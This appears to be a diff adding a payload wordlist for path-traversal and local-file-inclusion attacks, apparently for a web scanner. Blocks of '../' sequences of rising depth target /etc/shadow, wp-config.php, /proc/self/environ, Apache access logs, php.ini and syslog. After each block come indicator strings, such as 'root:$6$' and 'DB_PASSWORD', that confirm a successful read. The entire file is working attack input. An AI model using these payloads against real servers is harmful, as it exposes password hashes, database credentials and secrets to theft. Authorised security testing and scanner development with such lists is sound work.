@@ -1,0 +1,191 @@
+# Payloads
+../../proc/self/environ
+../../../proc/self/environ
+../../../../proc/self/environ
+../../../../../proc/self/environ
+../../../../../../proc/self/environ
+../../../../../../../proc/self/environ
+../../../../../../../../proc/self/environ
+../../../../../../../../../proc/self/environ
+../../../../../../../../../../proc/self/environ
+../../../../../../../../../../../proc/self/environ
+
+# Indicators
+DOCUMENT_ROOT=/var/www
+USER=www-data
+HOME=/var/www
+PATH=/usr/local/sbin
+
+# Payloads
+../../var/log/apache2/access.log
+../../../var/log/apache2/access.log
+../../../../var/log/apache2/access.log
+../../../../../var/log/apache2/access.log
+../../../../../../var/log/apache2/access.log
+../../../../../../../var/log/apache2/access.log
+../../../../../../../../var/log/apache2/access.log
+../../../../../../../../../var/log/apache2/access.log
+../../../../../../../../../../var/log/apache2/access.log
+../../../../../../../../../../../var/log/apache2/access.log
+../../var/log/apache/access.log
+../../../var/log/apache/access.log
+../../../../var/log/apache/access.log
+../../../../../var/log/apache/access.log
+../../../../../../var/log/apache/access.log
+../../../../../../../var/log/apache/access.log
+../../../../../../../../var/log/apache/access.log
+../../../../../../../../../var/log/apache/access.log
+../../../../../../../../../../var/log/apache/access.log
+../../../../../../../../../../../var/log/apache/access.log
+
+# Indicators
+] "GET / HTTP/1.1" 200 
+] "POST / HTTP/1.1" 200 
+<client IP> - - [
+
+# Payloads
+../../etc/php/php.ini
+../../../etc/php/php.ini
+../../../../etc/php/php.ini
+../../../../../etc/php/php.ini
+../../../../../../etc/php/php.ini
+../../../../../../../etc/php/php.ini
+../../../../../../../../etc/php/php.ini
+../../../../../../../../../etc/php/php.ini
+../../../../../../../../../../etc/php/php.ini
+../../../../../../../../../../../etc/php/php.ini
+../../usr/local/etc/php.ini
+../../../usr/local/etc/php.ini
+../../../../usr/local/etc/php.ini
+../../../../../usr/local/etc/php.ini
+../../../../../../usr/local/etc/php.ini
+../../../../../../../usr/local/etc/php.ini
+../../../../../../../../usr/local/etc/php.ini
+../../../../../../../../../usr/local/etc/php.ini
+../../../../../../../../../../usr/local/etc/php.ini
+../../../../../../../../../../../usr/local/etc/php.ini
+
+# Indicators
+[PHP]
+extension_dir = 
+display_errors = Off
+memory_limit = 
+
+# Payloads
+../../var/log/syslog
+../../../var/log/syslog
+../../../../var/log/syslog
+../../../../../var/log/syslog
+../../../../../../var/log/syslog
+../../../../../../../var/log/syslog
+../../../../../../../../var/log/syslog
+../../../../../../../../../var/log/syslog
+../../../../../../../../../../var/log/syslog
+../../../../../../../../../../../var/log/syslog
+../../var/log/messages
+../../../var/log/messages
+../../../../var/log/messages
+../../../../../var/log/messages
+../../../../../../var/log/messages
+../../../../../../../var/log/messages
+../../../../../../../../var/log/messages
+../../../../../../../../../var/log/messages
+../../../../../../../../../../var/log/messages
+../../../../../../../../../../../var/log/messages
+
+# Indicators
+systemd[1]: Starting
+kernel: [    0.000000]
+CRON[
+sshd[
+
+# Payloads
+../../.htaccess
+../../../.htaccess
+../../../../.htaccess
+../../../../../.htaccess
+../../../../../../.htaccess
+../../../../../../../.htaccess
+../../../../../../../../.htaccess
+../../../../../../../../../.htaccess
+../../../../../../../../../../.htaccess
+../../../../../../../../../../../.htaccess
+../../wp-config.php
+../../../wp-config.php
+../../../../wp-config.php
+../../../../../wp-config.php
+../../../../../../wp-config.php
+../../../../../../../wp-config.php
+../../../../../../../../wp-config.php
+../../../../../../../../../wp-config.php
+../../../../../../../../../../wp-config.php
+../../../../../../../../../../../wp-config.php
+
+# Indicators
+RewriteEngine On
+AuthType Basic
+DB_NAME
+DB_PASSWORD
+
+# Payloads
+../../etc/shadow
+../../../etc/shadow
+../../../../etc/shadow
+../../../../../etc/shadow
+../../../../../../etc/shadow
+../../../../../../../etc/shadow
+../../../../../../../../etc/shadow
+../../../../../../../../../etc/shadow
+../../../../../../../../../../etc/shadow
+../../../../../../../../../../../etc/shadow
+
+# Indicators
+root:$6$
+root:$1$
+root:$5$
+root:!
+
+# Payloads
+../../proc/version
+../../../proc/version
+../../../../proc/version
+../../../../../proc/version
+../../../../../../proc/version
+../../../../../../../proc/version
+../../../../../../../../proc/version
+../../../../../../../../../proc/version
+../../../../../../../../../../proc/version
+../../../../../../../../../../../proc/version
+../../proc/cpuinfo
+../../../proc/cpuinfo
+../../../../proc/cpuinfo
+../../../../../proc/cpuinfo
+../../../../../../proc/cpuinfo
+../../../../../../../proc/cpuinfo
+../../../../../../../../proc/cpuinfo
+../../../../../../../../../proc/cpuinfo
+../../../../../../../../../../proc/cpuinfo
+../../../../../../../../../../../proc/cpuinfo
+
+# Indicators
+Linux version
+cpu cores
+model name
+processor
+
+# Payloads
+../../etc/hosts
+../../../etc/hosts
+../../../../etc/hosts
+../../../../../etc/hosts
+../../../../../../etc/hosts
+../../../../../../../etc/hosts
+../../../../../../../../etc/hosts
+../../../../../../../../../etc/hosts
+../../../../../../../../../../etc/hosts
+../../../../../../../../../../../etc/hosts
+
+# Indicators
+127.0.0.1 localhost
+::1 localhost
+ip6-localhost
